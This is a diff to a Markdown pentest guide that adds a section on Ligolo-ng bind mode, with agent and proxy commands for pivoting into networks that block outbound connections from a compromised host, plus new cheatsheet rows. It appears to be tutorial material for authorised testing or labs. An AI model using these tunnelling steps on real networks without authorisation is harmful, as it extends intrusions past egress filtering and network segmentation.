@@ -183,7 +183,42 @@ The traffic hits Agent 1, Ligolo intercepts it, encrypts it, tunnels it back to 
 
 ---
 
-## 7. Cheatsheet & Troubleshooting
+## 7. Bind Mode (Egress Filtering Bypass)
+
+In strict environments with heavy egress filtering, the compromised machine may not be allowed to initiate outbound connections back to your attacker machine. To bypass this, Ligolo-ng supports **Bind Mode**.
+
+Instead of the agent connecting to the proxy, the agent binds to a local port and waits. The proxy (attacker) then initiates the connection to the agent.
+
+### 1. Start the Agent in Bind Mode
+
+On the compromised target, run the agent with the `-bind` flag:
+
+```powershell
+# Windows Target
+.\agent.exe -bind 0.0.0.0:11601 -ignore-cert
+```
+
+```bash
+# Linux Target
+./agent -bind 0.0.0.0:11601 -ignore-cert
+```
+
+### 2. Connect from the Proxy
+
+In your running Ligolo-ng proxy terminal (which must already be able to route to the target's IP, either natively or through a previous Ligolo pivot), initiate the connection:
+
+```text
+ligolo-ng » connect 10.10.10.25:11601
+```
+
+Once connected, you will get a new session just like a reverse connection. Switch to it via `session`, type `start`, and add your routes as normal.
+
+!!! tip
+      **Double Pivoting:** Bind mode pairs perfectly with double pivoting! If Target B is isolated from the internet, run Agent 2 in bind mode. Since Agent 1's tunnel is active, your proxy can seamlessly reach Target B's bind port *through* Agent 1.
+
+---
+
+## 8. Cheatsheet & Troubleshooting
 
 ### Command Quick Reference
 | Goal | Command / Location |
@@ -191,6 +226,8 @@ The traffic hits Agent 1, Ligolo intercepts it, encrypts it, tunnels it back to 
 | **Setup TUN** | `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up` |
 | **Start Proxy** | `./proxy -selfcert` |
 | **Run Agent** | `./agent -connect <proxy_ip>:11601 -ignore-cert` |
+| **Run Agent (Bind)**| `./agent -bind 0.0.0.0:11601 -ignore-cert` |
+| **Connect (Bind)** | `connect <agent_ip>:11601` (Inside Proxy Prompt) |
 | **Start Tunnel** | `start` (Inside Proxy Prompt) |
 | **Add Route (Host)** | `sudo ip route add <cidr> dev ligolo` |
 | **Add Route (Proxy)** | `interface_add_route --name <iface> --route <cidr>` (Wait for agent) |
